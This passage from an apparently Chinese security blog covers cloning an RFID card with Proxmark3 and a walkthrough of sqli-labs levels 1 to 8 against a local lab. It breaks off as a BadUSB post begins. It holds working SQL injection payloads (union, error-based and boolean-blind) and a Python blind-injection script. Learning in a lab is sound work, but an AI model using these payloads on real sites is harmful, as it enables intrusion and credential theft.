class="hljs-string">----------------</span>|<span class="hljs-string">---</span>||<span class="hljs-string">sec</span>|<span class="hljs-string">key A           </span>|<span class="hljs-string">res</span>|<span class="hljs-string">key B           </span>|<span class="hljs-string">res</span>||<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>||<span class="hljs-string">000</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">001</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">002</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">003</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">004</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">005</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">006</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">007</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">008</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">009</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">010</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">011</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">012</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">013</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">014</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">015</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|Printing keys to binary file dumpkeys.bin...</code></pre></p><p>导出后会在根目录生成一个dumpkeys.bin的文件，里面存放了16个扇区的密钥（16进制）<br><img src="/img/2018-07-26/8.png" srcset="/img/static/loading.gif" alt="8"></p><h6 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h6><p>拿到密码后我们就可以导出卡上的数据到电脑里<br><pre><code class="hljs undefined">proxmark3&gt; hf mf dump|-----------------------------------------||------ Reading sector access bits...-----||-----------------------------------------|#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED  .  .  .#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHED|-----------------------------------------||----- Dumping all blocks <span class="hljs-keyword">to</span> file... -----||-----------------------------------------|#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHEDSuccessfully <span class="hljs-keyword">read</span> <span class="hljs-keyword">block</span>  <span class="hljs-number">0</span> <span class="hljs-keyword">of</span> sector  <span class="hljs-number">0</span>.#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHEDSuccessfully <span class="hljs-keyword">read</span> <span class="hljs-keyword">block</span>  <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> sector  <span class="hljs-number">0</span>.  .  .  .#db# <span class="hljs-keyword">READ</span> <span class="hljs-keyword">BLOCK</span> FINISHEDSuccessfully <span class="hljs-keyword">read</span> <span class="hljs-keyword">block</span>  <span class="hljs-number">3</span> <span class="hljs-keyword">of</span> sector <span class="hljs-number">15</span>.Dumped <span class="hljs-number">64</span> blocks (<span class="hljs-number">1024</span> bytes) <span class="hljs-keyword">to</span> file dumpdata.bin</code></pre></p><p>同样16进制打开<br><img src="/img/2018-07-26/9.png" srcset="/img/static/loading.gif" alt="9"><br>因为是测试卡，所以里面就没什么数据ㄟ( ▔, ▔ )ㄏ。</p><h6 id="写入UID卡"><a href="#写入UID卡" class="headerlink" title="写入UID卡"></a>写入UID卡</h6><p>下一步把数据写进写UID卡<br>Proxmark3不能识别、使用bin文件，需要转换成eml格式<br>第一个方法是运行下面的命令转成eml格式<br><pre><code class="hljs undefined">proxmark3&gt; script run dumptoemul<span class="hljs-selector-class">.lua</span>--- Executing: ./scripts/dumptoemul<span class="hljs-selector-class">.lua</span>, args<span class="hljs-string">''</span>Wrote an emulator-dump to the file EA117DEE<span class="hljs-selector-class">.eml</span>-----Finished</code></pre></p><p>第二个方法是运行<code>dump to EML.bat</code>脚本转成eml格式<br><img src="/img/2018-07-26/10.png" srcset="/img/static/loading.gif" alt="10"><br>写入到白卡（UID卡）上<br><pre><code class="hljs undefined">proxmark3&gt; hf mf cload  dumpdataLoaded <span class="hljs-keyword">from</span> <span class="hljs-built_in">file</span>: dumpdata.eml</code></pre></p><p>写卡是没有回显的，只能通过读取的方式查看有没有读取成功，对比两张卡的数据就可以看到数据是一模一样的，克隆就完成了<br><strong>IC卡破解不止这一种方法，能力和设备有限，以后有机会会继续学习下去</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>Proxmark3</tag>
      
      <tag>RFID</tag>
      
      <tag>硬件破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs的学习记录一（1-8）</title>
    <link href="/2018/07/20/sqli-labs1/"/>
    <url>/2018/07/20/sqli-labs1/</url>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;偶然发现<code>sqli-labs</code>这个练习平台（本地），这个平台有很多案例可以提供给同学学习，很适合初学者入门。写篇博客<del>装个逼</del>记录下学习过程（假装我是大佬）<br><a id="more"></a></p><h4 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h4><ul><li>首先附上github的下载地址–&gt;<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">传送门</a></li><li>下载<code>phpstudy</code>，phpstudy的站点目录是这个<code>PHPTutorial\WWW</code>，把刚刚下载的平台解压放到里面</li><li>如果我没记错的话，phpstudy的mysql初始密码是root，在<code>sql-connections\db-creds.inc</code>写上你的mysql数据库密码<br><img src="/img/2018-07-20/1.png" srcset="/img/static/loading.gif" alt="1"><br>上述步骤做完后就可以启动phpstudy，然后打开火狐浏览器（记得安装hackbar插件），访问<code>localhost/sqli-labs-master/</code>看待下面的页面就算安装好了<br>点击<code>Setup/reset Database for labs</code>建立数据库<br><img src="/img/2018-07-20/2.png" srcset="/img/static/loading.gif" alt="2"></li></ul><h4 id="开始学习"><a href="#开始学习" class="headerlink" title="开始学习"></a>开始学习</h4><h5 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h5><p>第一关是最简单的一关了，直接<code>id=1&#39;</code>就报错了<br><img src="/img/2018-07-20/3.png" srcset="/img/static/loading.gif" alt="3"><br>再测试<code>id=1&#39; and &#39;1&#39;=&#39;1</code><br><img src="/img/2018-07-20/4.png" srcset="/img/static/loading.gif" alt="4"><br>返回正常，不难想象我们想数据库递交<code>id=1</code>的语句为<br><pre><code class="hljs undefined"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'1'</span></code></pre></p><p>递交<code>id=1&#39; and &#39;1&#39;=&#39;1</code>的语句为<br><pre><code class="hljs undefined"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'1'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span></code></pre></p><p>接下来测试<code>id=1&#39; union select database() -- +</code>，<code>-- +</code>是注释符<br><img src="/img/2018-07-20/5.png" srcset="/img/static/loading.gif" alt="5"><br>发现报错了，错误上说了，列的数量对不上，修改为<code>id=1&#39; union select 1,2,database() -- +</code>,页面返回正常但没有返回我们所希望的数据库名称<br>这个是因为index.php中<code>mysql_fetch_array</code>函数只调用了一个<br><img src="/img/2018-07-20/6.png" srcset="/img/static/loading.gif" alt="6"><br><code>mysql_fetch_array</code>函数的作用是从结果集中取得一行作为关联数组或数字数组或二者兼有，可以在终端下试一下，这里就不演示了，下面是我们提交sql查询语句在终端下的结果<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select * from users where id = '1' union select 1,2,database();+----+----------+----------+</span><span class="hljs-section">| id | username | password |+----+----------+----------+</span>|  1 | Dumb     | Dumb     |<span class="hljs-section">|  1 | 2        | security |+----+----------+----------+</span>2 rows in set (0.00 sec)</code></pre></p><p>上面查询结果可以看到返回了两个结果，但是<code>mysql_fetch_array</code>只取一行，也就是说要让查询出来的结果放在第一行，这里就用最简单快捷的一种,把id的1改为-1，-1查询不到，因此结果就是我们想要的<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select * from users where id = '-1' union select 1,2,database();+----+----------+----------+</span><span class="hljs-section">| id | username | password |+----+----------+----------+</span><span class="hljs-section">|  1 | 2        | security |+----+----------+----------+</span>1 row in set (0.00 sec)</code></pre></p><p>最终的payload为<code>id=-1&#39; union select 1,2,database() -- +</code><br><img src="/img/2018-07-20/7.png" srcset="/img/static/loading.gif" alt="7"><br>由于这篇文章是面向初学者写的，可能会比较啰嗦，mysql数据库初始时有四个数据库，如下<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; show databases;+--------------------+</span><span class="hljs-section">| Database           |+--------------------+</span>| information<span class="hljs-emphasis">_schema || mysql              || performance_</span>schema |<span class="hljs-section">| test               |+--------------------+</span>4 rows in set (0.01 sec)</code></pre></p><p>其中，<code>information_schema</code>这个数据库中存着所有数据库的名字及表单列名，详细的细节这里不列出来有不懂的兴趣的可以去了解一下–&gt;<a href="https://www.jianshu.com/p/ea15158f39f7" target="_blank" rel="noopener">传送门</a>，我们也是要先在这个数据库里找到当前数据库的表单和列名才可以把某个表的数据列出来<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select table_name from information_schema.tables where table_schema = 'security';+------------+</span><span class="hljs-section">| table_name |+------------+</span>| emails     || referers   || uagents    |<span class="hljs-section">| users      |+------------+</span>4 rows in set (0.00 sec)</code></pre></p><p>这里可以偷个懒，我们可以不找数据库名直接让<code>table_schema=database()</code>就可以省了一步<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select table_name from information_schema.tables where table_schema = database();+------------+</span><span class="hljs-section">| table_name |+------------+</span>| emails     || referers   || uagents    |<span class="hljs-section">| users      |+------------+</span>4 rows in set (0.00 sec)</code></pre></p><p>所以我们的payload为<br><pre><code class="hljs undefined">id=<span class="hljs-number">-1</span>' <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,table_name <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema = 'security' -- +</code></pre></p><p><img src="/img/2018-07-20/8.png" srcset="/img/static/loading.gif" alt="8"><br>但是这样我们只能得到一个表，下面要用到一个函数<code>group__concat</code>，下面演示一下效果<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select group_concat(table_name) from information_schema.tables where table_schema = 'security';+-------------------------------+</span><span class="hljs-section">| group_concat(table_name)      |+-------------------------------+</span><span class="hljs-section">| emails,referers,uagents,users |+-------------------------------+</span>1 row in set (0.00 sec)</code></pre></p><p><code>group_concat</code>的作用就是把多个查询结果并到一起，于是payload修改为<br><pre><code class="hljs undefined">id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">'security'</span> <span class="hljs-comment">-- +</span></code></pre></p><p><img src="/img/2018-07-20/9.png" srcset="/img/static/loading.gif" alt="9"><br>用户账号密码应该在users表里头了,我们要查的表就是<code>users</code>表了，简单修改一下payload，把<code>table_name</code>换成<code>column_name</code>，把<code>information_schema.tables</code>换成<code>information_schema.columns</code>，再把<code>table_schema</code>换成<code>table_name</code>，payload为<br><pre><code class="hljs undefined">id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">'users'</span> <span class="hljs-comment">-- +</span></code></pre></p><p><img src="/img/2018-07-20/10.png" srcset="/img/static/loading.gif" alt="10"><br>列也知道了，我们就直接枚举username和password，payload为<br><pre><code class="hljs undefined"><span class="hljs-attribute">id</span>=-1' union select 1,group_concat(username),group_concat(password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>-- +</code></pre></p><p><img src="/img/2018-07-20/11.png" srcset="/img/static/loading.gif" alt="11"><br>第一关就算是过了</p><h5 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h5><p>第二关和第一关如出一辙，只不过id后面的内容没有引号引起来，php代码对比如下<br><pre><code class="hljs undefined">SELECT * <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">id</span>=<span class="hljs-string">'$id'</span> LIMIT 0,1<span class="hljs-comment">#第一关</span>SELECT * <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">id</span>=<span class="hljs-variable">$id</span> LIMIT 0,1第二关</code></pre></p><p>所以我们把paylaod的<code>id-1</code>后面的单引号去掉就好了甚至注释符都不用<br>payload如下<br><pre><code class="hljs undefined">id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>()<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">'security'</span><span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">'users'</span><span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(username),<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span></code></pre></p><p>第二关完</p><h5 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h5><p>第三关<br><pre><code class="hljs undefined"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">'$id'</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre></p><p>多了括号，直接上payload吧<br><pre><code class="hljs undefined">id=<span class="hljs-number">-1</span>') union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() -- +</code></pre></p><p>就不多列了</p><h5 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h5><p>第四关<br>这次有点不同，当我们测试<code>id=1&#39;</code>时返回页面是正常的，测试<code>id=1&quot;</code>报错<br><img src="/img/2018-07-20/12.png" srcset="/img/static/loading.gif" alt="12"><br>根据报错信息来看，查询语句大概如下<br><pre><code class="hljs undefined">SELECT * <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE id=(<span class="hljs-string">"<span class="hljs-variable">$id</span>"</span>) LIMIT 0,1</code></pre></p><p>看一眼index.php，差不多<br><img src="/img/2018-07-20/13.png" srcset="/img/static/loading.gif" alt="13"><br>还是那个payload，换汤不换药<br><pre><code class="hljs undefined">id=-1") union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>() <span class="hljs-comment">-- +</span></code></pre></p><h5 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h5><p>第五关开始提高难度<br>首先从大纲里看到第五关是双注入（double injection）,单引号（single quote）<br><img src="/img/2018-07-20/14.png" srcset="/img/static/loading.gif" alt="14"><br>这个注入我也好久才理解，就不做了，直接分析<br><img src="/img/2018-07-20/15.png" srcset="/img/static/loading.gif" alt="15"><br>首先，sql查询正确会返回<code>You are in...........</code>，错误会返回sql的错误，也就是说我们输入正确的查询语句不会返回结果，所以我们要提交错误的查询语句，或者说会报错的语句比较合适，先介绍一些函数<code>count()</code>，<code>rand()</code>,<code>floor()</code>,<code>concat_ws</code><br><pre><code class="hljs undefined"><span class="hljs-function"><span class="hljs-title">count</span><span class="hljs-params">()</span></span>         计算总数<span class="hljs-function"><span class="hljs-title">rand</span><span class="hljs-params">()</span></span>     生成<span class="hljs-number">0</span>~<span class="hljs-number">1</span>的随机数<span class="hljs-function"><span class="hljs-title">floor</span><span class="hljs-params">()</span></span>    向下取整<span class="hljs-function"><span class="hljs-title">concat_ws</span><span class="hljs-params">()</span></span> 拼接查询结果</code></pre></p><p>最后一个可能不好理解，用例子说明下<br><pre><code class="hljs undefined"><span class="hljs-section">mysql&gt; select concat_ws(':',username,password) from users;+----------------------------------+</span><span class="hljs-section">| concat_ws(':',username,password) |+----------------------------------+</span>| Dumb:Dumb                        || admin:admin                      || admin1:admin1                    || admin2:admin2                    || admin3:admin3                    || dhakkan:dumbo                    |<span class="hljs-section">| admin4:admin4                    |+----------------------------------+</span>7 rows in set (0.00 sec)</code></pre></p><p>1<br>rand()<em>2生成0~2的随机数，floor(rand()</em>2)产生0或1<br>2<br>以<code>select database()</code>为例子<br><pre><code class="hljs undefined"><span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">':'</span>,<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))<span class="hljs-keyword">select</span> conut(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">':'</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a</code></pre></p><p><img src="/img/2018-07-20/16.png" srcset="/img/static/loading.gif" alt="16"><br>数据库名<code>security</code>已经出来了<br>关于原因<br><b><code>concat_ws(&#39;:&#39;,select database(),floor(rand()*2))</code>会产生一大堆<code>security:0</code>，<code>security:1</code>的查询结果，重点在<code>group by</code>，在排序时，排序的结果在临时表里，在插入前会先计算一遍要插入结果的内容，假如是<code>security:0</code>，如果此时临时表只有<code>security:1</code>的行不存在<code>security:0</code>的行，那么数据库要将该条记录插入临时表，由于后面的0和1是随机数，在插入时又要计算一次，那么此时的结果可能已经不再是<code>security:0</code>而变成了<code>security:1</code>了，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</b><br>后面的基本差不多，就不列了，有人可能把这道题当做盲注来做<del>一开始我也是这么想的</del></p><h5 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h5><p><b>双引号的双注入</b>&gt;，把less-5的单引号变成双引号，换汤不换药</p><h5 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h5><p><b>导入文件注入</b>，这个需要知道网站在系统中的具体位置，（网站管理员怎么可能给你知道。。）也比较难，网上也有写的狠详细的过程–&gt;<a href="https://www.cnblogs.com/lcamry/p/5763105.html" target="_blank" rel="noopener">传送门</a>,就直接下一关吧</p><h5 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h5><p>Blind Boolian Based（布尔盲注），这里又涉及到一个盲注的概念，上面的可以直接返回结果是直接注入拿到数据库表单及列等数据，盲注就是，查询结果正确页面返回正常，查询错误页面返回错误，不会带出数据<br>举很简单的例子,<code>1=1</code>正确<br><img src="/img/2018-07-20/17.png" srcset="/img/static/loading.gif" alt="17"><br><code>1=2</code>错误<br><img src="/img/2018-07-20/18.png" srcset="/img/static/loading.gif" alt="18"><br>然后注入方法就是不断的查询，通常盲注都要写脚本，先介绍一些函数，<code>ascii()</code>,这个函数式把字母变成ascii码值，<code>substr()</code>这个函数式切割字符串，假设<code>a=test</code>,<code>substr(a,1,1)=t</code>,<code>substr(a,2,1)=e</code>,以此类推，查数据库payload<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>' and ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt;= '<span class="hljs-number">97</span></code></pre></p><p><code>substr</code>取<code>database()</code>的第一个字符，ascii把它变化才能ascii码值，然后做对比，比较它的ascii码值是否大于等于97，即’a’<br><img src="/img/2018-07-20/19.png" srcset="/img/static/loading.gif" alt="19"><br>返回正确，然后一直判断下去，遍历所有字母，一个个去试肯定比较麻烦，所以首选写脚本，其次也不能一个个遍历，可以用二分法，可以节省很多时间，python自动跑数据库名脚本如下<br><pre><code class="hljs python">import requeststxt1 = "http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),"txt2 = ",1)) &gt;= '"txt3 = ",1)) = '"payload1 = 1 payload2 = 97txt4 = 'You are in..........'num11 = 97num12 = 65num13 = 48code = ''num1 = 0num2 = 0num3 = 0for i in range(1,9)://长度url = txt1+str(i)+txt2+str(num11)req = requests.get(url = url)reqtext = req.text[570:590]//reqtext是获取页面上的内容是不是等于txt4if(reqtext == txt4):num1 = 1url = txt1+str(i)+txt2+str(num12)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):num2 = 1url = txt1+str(i)+txt2+str(num13)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):num3 = 1//判断范围，数字48-57，大写65-90，小写97-122//字母切三次，判断三次，部分四次，abc def ghi jklm nop qrs tuv wxyz//数字切一次，判断五次，01234 56789if(num1 == 1):num = 97num += 13url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):num += 6else:num -= 7url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):num += 3else:num -= 3url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext != txt4):num -= 3if(reqtext == txt4) and ((num == 106) or (num == 119)):for j in range(num,num+4):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):code += chr(j)print codenum1 = 0num2 = 0num3 = 0else:for j in range(num,num+3):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):code += chr(j)print codenum1 = 0num2 = 0num3 = 0if(num1 == 0 and num2 == 1):num = 65num += 13url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):num += 6else:num -= 7url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):num += 3else:num -= 3url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext != txt4):num -= 3if(reqtext == txt4) and ((num == 74) or (num == 87)):for j in range(num,num+4):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):code += chr(j)print codenum1 = 0num2 = 0num3 = 0else:for j in range(num,num+3):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):code += chr(j)print codenum1 = 0num2 = 0num3 = 0if(num2 == 0 and num3 == 1):num =48num += 5url = txt1+str(i)+txt2+str(num)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):for j in range(num,num+5):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):code += chr(j)print codenum1 = 0num2 = 0num3 = 0else:num -= 5for j in range(num,num+5):url = txt1+str(i)+txt3+str(j)req = requests.get(url = url)reqtext = req.text[570:590]if(reqtext == txt4):code += chr(j)print codenum1 = 0num2 = 0num3 = 0</code></pre></p><p>结果如下<br><img src="/img/2018-07-20/20.png" srcset="/img/static/loading.gif" alt="20"><br>查表查列修改代码url部分即可,给出前面部分，长度需要自己调整，手工判断下就可以了，没有必要写脚本<br><pre><code class="hljs undefined">import requeststxt1 = <span class="hljs-string">"http://localhost/sqli-labs/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 2,1),"</span>txt2 = <span class="hljs-string">",1))) &gt;= '"</span>txt3 = <span class="hljs-string">",1))) = '"</span></code></pre></p><p>妈呀写博客比学的还累。。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>注入</tag>
      
      <tag>web</tag>
      
      <tag>盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>badusb的学习记录&amp;入侵windows主机</title>
    <link href="/2018/06/12/badusb/"/>
    <url>/2018/06/12/badusb/</url>
    
    <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>&emsp;&emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大<br><a id="more"></a></p><h4 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h4><p><img src="/img/2018-06-12/badusb.png" srcset="/img/static/loading.gif" alt="badusb"><br>&emsp;&emsp;灯灯灯凳，这个就是我们的主角啦<br>&emsp;&emsp;对于第一次玩硬件的小伙伴，硬件入门不难，但是要有耐心，很多时候是需要不断的去调试代码，查找资料，所以一定要有耐心。</p><h5 id="一、U盘的结构"><a href="#一、U盘的结构" class="headerlink" title="一、U盘的结构"></a>一、U盘的结构</h5><p>&emsp;&emsp;要想理解badusb攻击的方法就要先了解U盘的结构，U盘的主要结构如下<br><pre><code class="hljs undefined">|<span class="hljs-string">--------</span>|<span class="hljs-string">---------------</span>||<span class="hljs-string">  固件  </span>|<span class="hljs-string">   数据存储区   </span>||<span class="hljs-string">--------</span>|<span class="hljs-string">---------------</span>|</code></pre></p><p> &emsp;&emsp;U盘由芯片控制器和闪存两部分组成（也间接说明为什么U盘的额空间总是不够写的那么大），芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。</p><h5 id="usb协议"><a href="#usb协议" class="headerlink" title="usb协议"></a>usb协议</h5><p>&emsp;&emsp;现在很多设备都是用usb接口，摄像头、U盘、鼠标、键盘，无线键鼠的接收器，等等，为了兼容这么多设备，设计USB协议标准的时候就没有要求每个USB设备向网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备多个输入输出设备的特征。<br>&emsp;&emsp;问题就是在这里，当你插进一个U盘时电脑并没有鉴别你的U盘到是不是真的U盘，这样我们就有机可乘了<br><img src="/img/2018-06-12/xixixi.png" srcset="/img/static/loading.gif" alt="xixixi"></p><h5 id="入侵原理"><a href="#入侵原理" class="headerlink" title="入侵原理"></a>入侵原理</h5><p>正常的U盘插到电脑里的大概流程是下面这样的<br><pre><code class="hljs undefined">           <span 